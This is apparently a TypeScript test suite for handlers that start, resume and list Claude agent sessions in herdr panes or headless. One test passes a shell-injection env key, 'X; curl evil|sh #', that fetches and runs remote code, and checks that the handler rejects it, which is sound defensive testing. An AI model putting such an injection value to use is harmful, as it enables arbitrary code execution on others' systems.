import { expect, test } from "bun:test";
import { tmpdir } from "os";
import { join } from "path";
import { AGENT_NAMES } from "../../chat-names.ts";
import { openStateDb, signIn } from "../../state/index.ts";
import { createAgentHandlers, type HeadlessChild } from "../handlers/agent.ts";
import type { HerdrRunner } from "../../agent-herdr.ts";
import { repoLabel } from "../../repo-arg.ts";

let n = 0;
const REPO = "remote:example.com%2Fa%2Fb";

function okRunner(calls: string[][]): HerdrRunner {
  return async (args) => {
    calls.push(args);
    if (args[0] === "workspace" && args[1] === "list") return { stdout: JSON.stringify({ result: { workspaces: [] } }), exitCode: 0 };
    if (args[0] === "workspace" && args[1] === "create")
      return { stdout: JSON.stringify({ result: { root_pane: { pane_id: "w1:p1", tab_id: "w1:t1", workspace_id: "w1" } } }), exitCode: 0 };
    return { stdout: "{}", exitCode: 0 };
  };
}

interface FakeBg {
  ensure: () => Promise<{ socket: string; started: boolean }>;
  reprobe: () => Promise<{ ok: boolean; drift: string[] }>;
  ensureCalls: number;
  reprobeCalls: number;
}

function fakeBg(over: { socket?: string; ensureError?: Error; drift?: string[] } = {}): FakeBg {
  const self: FakeBg = {
    ensureCalls: 0,
    reprobeCalls: 0,
    ensure: async () => {
      self.ensureCalls++;
      if (over.ensureError) throw over.ensureError;
      return { socket: over.socket ?? "/bg.sock", started: true };
    },
    reprobe: async () => {
      self.reprobeCalls++;
      const drift = over.drift ?? [];
      return { ok: drift.length === 0, drift };
    },
  };
  return self;
}

interface FakeBgClaims {
  claim: (owner: string, pane?: string) => void;
  claims: Array<{ owner: string; pane?: string }>;
}

function fakeBgClaims(): FakeBgClaims {
  const claims: Array<{ owner: string; pane?: string }> = [];
  return { claims, claim: (owner, pane) => { claims.push({ owner, pane }); } };
}

interface FakeLifecycle {
  watch: (socket: string) => void;
  watched: string[];
}

function fakeLifecycle(): FakeLifecycle {
  const watched: string[] = [];
  return { watched, watch: (socket) => { watched.push(socket); } };
}

function fresh(over: {
  runner?: HerdrRunner;
  runnerFactory?: (socket: string) => HerdrRunner;
  spawn?: (argv: string[], cwd: string) => HeadlessChild;
  emit?: (t: string, p?: unknown) => void;
  insertAgentFn?: (...args: unknown[]) => void;
  bg?: FakeBg;
  bgClaims?: FakeBgClaims;
  lifecycle?: FakeLifecycle;
} = {}) {
  const db = openStateDb(join(tmpdir(), `agent-h-${process.pid}-${n++}.db`));
  // Handlers no longer expose `db` (R028); tests that need to reach the
  // underlying table directly get it back alongside the handler map.
  return Object.assign(createAgentHandlers({
    db,
    emitEvent: over.emit ?? (() => 0),
    herdrRunner: over.runner,
    herdrRunnerForSocket: over.runnerFactory,
    spawnHeadless: over.spawn,
    insertAgentFn: over.insertAgentFn as typeof import("../../state/index.ts").insertAgent | undefined,
    bg: over.bg,
    bgClaims: over.bgClaims,
    lifecycle: over.lifecycle,
  }), { db });
}

test("agent:start returns ok:false for a null payload instead of throwing on destructure", async () => {
  const h = fresh();
  const res = await h["agent:start"](null as unknown as never);
  expect(res.ok).toBe(false);
});

test("agent:start herdr records pane ids and a minted session uuid", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", model: "haiku" });
  expect(res.ok).toBe(true);
  if (!res.ok) throw new Error("unreachable");
  expect(res.data.sessionId).toMatch(/^[0-9a-f-]{36}$/);
  expect(res.data).toMatchObject({ surface: "herdr", paneId: "w1:p1", tabId: "w1:t1", workspaceId: "w1", model: "haiku" });
  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain(`'--session-id' '${res.data.sessionId}'`);
  expect(paneRun?.[3]).toContain("cd '/tmp/x'");
});

// Pins the rollback: a launch failure must not leave a phantom record that
// never launched, was never resumed, and can never finish.
test("agent:start herdr rolls back the inserted record when launch fails", async () => {
  const throwingRunner: HerdrRunner = async () => {
    throw new Error("herdr unavailable");
  };
  const h = fresh({ runner: throwingRunner });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
  expect(res.ok).toBe(false);
  const list = await h["agent:list"]({});
  if (!list.ok) throw new Error("unreachable");
  expect(list.data.agents).toHaveLength(0);
});

// Pins S051: a tab-label dedup must never report success with a phantom
// record nothing is listening on (rt agent resume on it would run
// `claude --resume` for a session that never started).
test("agent:start herdr returns ok:false and rolls back when herdr dedups the tab label", async () => {
  const label = "!7";
  const focusCalls: string[][] = [];
  const runner: HerdrRunner = async (args) => {
    focusCalls.push(args);
    if (args[0] === "workspace" && args[1] === "list") {
      return { stdout: JSON.stringify({ result: { workspaces: [{ workspace_id: "w1", label: repoLabel(REPO) }] } }), exitCode: 0 };
    }
    if (args[0] === "tab" && args[1] === "list") {
      return { stdout: JSON.stringify({ result: { tabs: [{ tab_id: "w1:t9", label } ] } }), exitCode: 0 };
    }
    return { stdout: "{}", exitCode: 0 };
  };
  const h = fresh({ runner });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", tab: label });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toMatch(/already open/);
  expect(focusCalls.some((c) => c[0] === "tab" && c[1] === "focus")).toBe(true);
  expect(focusCalls.some((c) => c[0] === "pane" && c[1] === "run")).toBe(false);
  const list = await h["agent:list"]({});
  if (!list.ok) throw new Error("unreachable");
  expect(list.data.agents).toHaveLength(0);
});

// Pins the guard: a no-op insert (standing in for runCriticalWrite giving up
// after sustained SQLITE_BUSY) must block the launch, not just the record.
test("agent:start refuses to launch when the insert did not persist", async () => {
  const calls: string[][] = [];
  let spawnCalled = false;
  const h = fresh({
    runner: okRunner(calls),
    spawn: () => {
      spawnCalled = true;
      return { exited: Promise.resolve(0), stdout: async () => "{}" };
    },
    insertAgentFn: () => {},
  });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toMatch(/not recorded/);
  expect(calls).toHaveLength(0);
  expect(spawnCalled).toBe(false);
});

test("agent:start headless refuses a missing prompt", async () => {
  const h = fresh();
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless" });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toMatch(/prompt/);
});

// buildClaudeArgv has no pane shell line for headless to interpolate env
// into, so a caller-supplied env would be silently dropped rather than
// applied; refuse instead of spawning without it.
test("agent:start headless with env is refused and spawns nothing", async () => {
  let spawnCalled = false;
  const h = fresh({ spawn: () => { spawnCalled = true; return { exited: Promise.resolve(0), stdout: async () => "{}" }; } });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless", prompt: "go", env: { HERD_ID: "demo-1" } });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toBe("env is only supported for the herdr surface");
  expect(spawnCalled).toBe(false);
  const list = await h["agent:list"]({});
  if (!list.ok) throw new Error("unreachable");
  expect(list.data.agents).toHaveLength(0);
});

// R033: an unchecked surface value falls through to the headless spawn path
// with headless=false, spawning an interactive claude with stdin ignored
// and recording surface "bogus" — never a caller-visible error.
test("agent:start rejects a surface outside herdr/headless, naming the allowed values", async () => {
  const h = fresh();
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "bogus" as any });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toContain("surface");
  expect(res.error).toContain("herdr");
  expect(res.error).toContain("headless");
  const list = await h["agent:list"]({});
  if (!list.ok) throw new Error("unreachable");
  expect(list.data.agents).toHaveLength(0);
});

test("agent:start headless finishes the record and emits agent/done", async () => {
  const emitted: string[] = [];
  let resolveExit!: (c: number) => void;
  const child: HeadlessChild = {
    exited: new Promise<number>((r) => (resolveExit = r)),
    stdout: async () => JSON.stringify({ result: "ok" }),
  };
  const h = fresh({ spawn: () => child, emit: (t) => emitted.push(t) });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless", prompt: "go" });
  expect(res.ok).toBe(true);
  if (!res.ok) throw new Error("unreachable");
  expect(res.data.finishedAt).toBeUndefined();
  resolveExit(0);
  await new Promise((r) => setTimeout(r, 20));
  const got = await h["agent:get"]({ id: res.data.id });
  if (!got.ok) throw new Error("unreachable");
  expect(got.data.exitCode).toBe(0);
  expect(got.data.resultPath).toBeTruthy();
  expect(emitted).toContain(`agent/done/${res.data.id}`);
});

// Pins the ordering invariant: insertAgent runs before spawnHeadless is ever
// called, so an already-resolved `exited` (the tightest possible race) still
// finds its row when finishAgent's completion callback runs.
test("agent:start headless whose exit resolves immediately still finds its own row", async () => {
  const child: HeadlessChild = {
    exited: Promise.resolve(0),
    stdout: async () => JSON.stringify({ result: "ok" }),
  };
  const h = fresh({ spawn: () => child });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless", prompt: "go" });
  expect(res.ok).toBe(true);
  if (!res.ok) throw new Error("unreachable");
  await new Promise((r) => setTimeout(r, 20));
  const got = await h["agent:get"]({ id: res.data.id });
  if (!got.ok) throw new Error("unreachable");
  expect(got.data.exitCode).toBe(0);
  expect(got.data.finishedAt).toBeGreaterThan(0);
});

test("agent:resume herdr uses ↺ tab label and --resume, overwrites pane ids", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", label: "job7" });
  if (!started.ok) throw new Error("unreachable");
  calls.length = 0;
  const resumed = await h["agent:resume"]({ id: started.data.id });
  expect(resumed.ok).toBe(true);
  if (!resumed.ok) throw new Error("unreachable");
  const tabArg = calls.find((c) => c[0] === "tab" && c[1] === "rename")?.[3] ?? calls.find((c) => c[1] === "create" && c[0] === "tab")?.[5];
  expect(tabArg).toBe("↺ job7");
  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain(`'--resume' '${started.data.sessionId}'`);
  expect(paneRun?.[3]).not.toContain("--session-id");
  expect(resumed.data.lastResumedAt).toBeGreaterThan(0);
});

test("agent:resume headless without prompt is refused; unknown id errors", async () => {
  const h = fresh({ runner: okRunner([]) });
  const missing = await h["agent:resume"]({ id: "ag-ffffffff" });
  expect(missing.ok).toBe(false);
  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
  if (!started.ok) throw new Error("unreachable");
  const res = await h["agent:resume"]({ id: started.data.id, surface: "headless" });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toMatch(/prompt/);
});

test("agent:resume honors workspace and tab overrides", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", label: "L" });
  if (!started.ok) throw new Error("unreachable");
  calls.length = 0;
  const resumed = await h["agent:resume"]({ id: started.data.id, workspace: "reviews", tab: "⟲ !5" });
  expect(resumed.ok).toBe(true);
  expect(calls.find((c) => c[0] === "workspace" && c[1] === "create")?.[3]).toBe("reviews");
  const tabArg = calls.find((c) => c[0] === "tab" && c[1] === "rename")?.[3]
    ?? calls.find((c) => c[0] === "tab" && c[1] === "create")?.[5];
  expect(tabArg).toBe("⟲ !5");
});

test("agent:start herdr reserves a handle not held by live presence, passes it as --name, and stamps AgentRecord.handle", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const held = AGENT_NAMES[0]!;
  signIn({ sessionId: "s-held", baseHandle: held, cwd: "/tmp/held" }, h.db);

  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
  expect(res.ok).toBe(true);
  if (!res.ok) throw new Error("unreachable");
  expect(res.data.handle).toBeTruthy();
  expect(AGENT_NAMES).toContain(res.data.handle!);
  expect(res.data.handle).not.toBe(held);

  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain(`'--name' '${res.data.handle}'`);
  expect(paneRun?.[3]).toContain(`'--settings' '{"crossSessionInbound":"accept"}'`);
});

test("agent:start headless never reserves a handle or passes --name/--settings", async () => {
  let argv: string[] = [];
  const h = fresh({
    spawn: (a) => {
      argv = a;
      return { exited: Promise.resolve(0), stdout: async () => "{}" };
    },
  });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", surface: "headless", prompt: "go" });
  expect(res.ok).toBe(true);
  if (!res.ok) throw new Error("unreachable");
  expect(res.data.handle).toBeUndefined();
  expect(argv).not.toContain("--name");
  expect(argv).not.toContain("--settings");
});

test("agent:resume threads the reserved handle back into --name", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const started = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr" });
  if (!started.ok) throw new Error("unreachable");
  calls.length = 0;
  const resumed = await h["agent:resume"]({ id: started.data.id });
  expect(resumed.ok).toBe(true);
  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain(`'--name' '${started.data.handle}'`);
});

test("agent:start passes env into the pane command", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { HERD_ID: "demo-1" } });
  expect(res.ok).toBe(true);
  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain("HERD_ID='demo-1' claude");
});

// buildPaneCommand quotes env values but not keys, so a key that is not a
// plain identifier would ride into the pane's shell line as syntax.
test("agent:start refuses an env key that is not a shell identifier and launches nothing", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", env: { "X; curl evil|sh #": "1" } });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toBe("invalid env key");
  expect(calls).toEqual([]);
  const list = await h["agent:list"]({});
  if (!list.ok) throw new Error("unreachable");
  expect(list.data.agents).toHaveLength(0);
});

test("agent:start with herdrSocket builds a runner on that socket", async () => {
  const seenSockets: string[] = [];
  const h = fresh({
    runnerFactory: (socket) => { seenSockets.push(socket); return okRunner([]); },
  });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", herdrSocket: "/tmp/hidden.sock" });
  expect(res.ok).toBe(true);
  expect(seenSockets).toEqual(["/tmp/hidden.sock"]);
});

test("agent:start with handle uses it as --name and reserves no pool handle", async () => {
  const calls: string[][] = [];
  const h = fresh({ runner: okRunner(calls) });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "herdr", handle: "job-a" });
  if (!res.ok) throw new Error(res.error);
  expect(res.data.handle).toBe("job-a");
  const paneRun = calls.find((c) => c[0] === "pane" && c[1] === "run");
  expect(paneRun?.[3]).toContain("'--name' 'job-a'");
});

test("agent:list filters by repo", async () => {
  const h = fresh({ runner: okRunner([]) });
  await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "a", surface: "herdr" });
  await h["agent:start"]({ repo: "remote:other%2Fr", cwd: "/tmp/y", prompt: "b", surface: "herdr", tab: "t2" });
  const res = await h["agent:list"]({ repo: REPO });
  if (!res.ok) throw new Error("unreachable");
  expect(res.data.agents).toHaveLength(1);
});

// --bg: launches onto the daemon-owned background server (T5's bg.ensure)
// with a claim scoped to the launched pane (T4's claims store).
test("agent:start bg ensures the background server, launches onto it, and claims the pane by its bg: ref", async () => {
  const seenSockets: string[] = [];
  const bg = fakeBg({ socket: "/bg.sock" });
  const bgClaims = fakeBgClaims();
  const lifecycle = fakeLifecycle();
  const h = fresh({
    runnerFactory: (socket) => { seenSockets.push(socket); return okRunner([]); },
    bg, bgClaims, lifecycle,
  });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", bg: true });
  if (!res.ok) throw new Error(res.error);
  expect(bg.ensureCalls).toBe(1);
  expect(seenSockets).toEqual(["/bg.sock"]);
  expect(lifecycle.watched).toEqual(["/bg.sock"]);
  expect(res.data.paneId).toBe("bg:w1:p1");
  expect(bgClaims.claims).toEqual([{ owner: `agent:${res.data.id}`, pane: "bg:w1:p1" }]);
});

test("agent:start rejects --bg combined with --surface headless", async () => {
  const bg = fakeBg();
  const bgClaims = fakeBgClaims();
  const lifecycle = fakeLifecycle();
  const h = fresh({ bg, bgClaims, lifecycle });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", surface: "headless", bg: true });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toBe("--bg is a herdr-surface option");
  expect(bg.ensureCalls).toBe(0);
});

test("agent:start bg without a bg service wired refuses instead of throwing", async () => {
  const h = fresh();
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", bg: true });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(res.error).toMatch(/daemon/);
});

test("agent:start bg launch failure shaped as command-not-found reprobes and folds drift into the error", async () => {
  const bg = fakeBg({ socket: "/bg.sock", drift: ["bun: bg=\"\" visible=\"/opt/homebrew/bin/bun\""] });
  const bgClaims = fakeBgClaims();
  const lifecycle = fakeLifecycle();
  const throwing: HerdrRunner = async () => { throw new Error("herdr not found at /bg/.local/bin/herdr (install via `rt setup` / brew)"); };
  const h = fresh({ runnerFactory: () => throwing, bg, bgClaims, lifecycle });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", bg: true });
  expect(res.ok).toBe(false);
  if (res.ok) throw new Error("unreachable");
  expect(bg.reprobeCalls).toBe(1);
  expect(res.error).toContain("herdr not found at");
  expect(res.error).toContain("bg env drift");
  expect(res.error).toContain("bun:");
  expect(bgClaims.claims).toEqual([]);
});

test("agent:start bg launch failure NOT shaped as command-not-found never reprobes", async () => {
  const bg = fakeBg({ socket: "/bg.sock" });
  const bgClaims = fakeBgClaims();
  const lifecycle = fakeLifecycle();
  const throwing: HerdrRunner = async () => { throw new Error("herdr workspace list failed (1): some other RPC error"); };
  const h = fresh({ runnerFactory: () => throwing, bg, bgClaims, lifecycle });
  const res = await h["agent:start"]({ repo: REPO, cwd: "/tmp/x", prompt: "hi", bg: true });
  expect(res.ok).toBe(false);
  expect(bg.reprobeCalls).toBe(0);
});
